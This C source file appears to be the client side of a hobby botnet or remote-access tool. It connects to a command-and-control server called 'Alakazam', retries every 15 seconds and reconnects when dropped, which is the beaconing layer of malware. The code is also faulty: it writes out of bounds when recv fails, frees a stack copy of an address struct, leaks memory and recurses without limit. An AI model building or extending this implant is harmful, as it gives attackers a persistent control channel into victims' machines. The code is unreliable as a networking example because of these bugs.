#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define CNC_HOST "127.0.0.1"
#define CNC_PORT "26016"

#define RETRY_INTERVAL 15

SOCKET *cnc = NULL;

void init_winsock() {
  int res;
  WSADATA wsaData;
  res = WSAStartup(MAKEWORD(2, 2), &wsaData);
  if (res != 0) {
    printf("WSAStartup failed: %d\n", res);
    exit(1);
  }
}

struct addrinfo get_cnc_info() {
  int res;
  struct addrinfo *result = NULL, hints = {.ai_family = AF_UNSPEC,
                                           .ai_socktype = SOCK_STREAM,
                                           .ai_protocol = IPPROTO_TCP};
  res = getaddrinfo(CNC_HOST, CNC_PORT, &hints, &result);
  if (res != 0) {
    printf("Failed to get CNC info: %d\n", res);
    WSACleanup();
    exit(1);
  }
  return *result;
}

void init_cnc_sock() {
  struct addrinfo cncinfo = get_cnc_info();
  SOCKET *conn = malloc(sizeof(SOCKET));
  *conn = socket(cncinfo.ai_family, cncinfo.ai_socktype, cncinfo.ai_protocol);
  if (*conn == INVALID_SOCKET) {
    printf("Error at CNC socket initialization: %d\n", WSAGetLastError());
    freeaddrinfo(&cncinfo);
    WSACleanup();
    exit(1);
  } else {
    cnc = conn;
  }
}

void connect_to_cnc() {
  printf("Connecting to Alakazam.\n");
  struct addrinfo cncinfo = get_cnc_info();
  int res = connect(*cnc, cncinfo.ai_addr, cncinfo.ai_addrlen);
  if (res == SOCKET_ERROR) {
    int err_code = WSAGetLastError();
    if (err_code == WSAECONNREFUSED) {
      printf("Alakazam is down, retrying in %d seconds.\n", RETRY_INTERVAL);
      Sleep(RETRY_INTERVAL * 1000);
      connect_to_cnc();
    } else {
      printf("Unable to connect to CNC: %d\n", WSAGetLastError());
      WSACleanup();
      exit(1);
    }
  } else {
    printf("Connected to Alakazam successfully.\n");
  }
}

void start_client() {
  init_winsock();
  init_cnc_sock();
  connect_to_cnc();
}

void send_to_cnc(char *buf) {
  int res = send(*cnc, buf, strlen(buf), 0);
  if (res == SOCKET_ERROR) {
    printf("Failed sending to CNC: %d\n", WSAGetLastError());
    exit(1);
  }
}

char *recv_from_cnc(int bufsize) {
  char *buf = malloc(bufsize + 1);
  int bytesread = recv(*cnc, buf, bufsize, 0);
  buf[bytesread] = '\0';
  if (bytesread == SOCKET_ERROR) {
    printf("Failed receiving from CNC: %d\n", WSAGetLastError());
    exit(1);
  } else if (bytesread == 0) {
    printf("Alakazam closed the connection.\n");
    closesocket(*cnc);
    init_cnc_sock();
    connect_to_cnc();
    return recv_from_cnc(bufsize);
  }
  return buf;
}
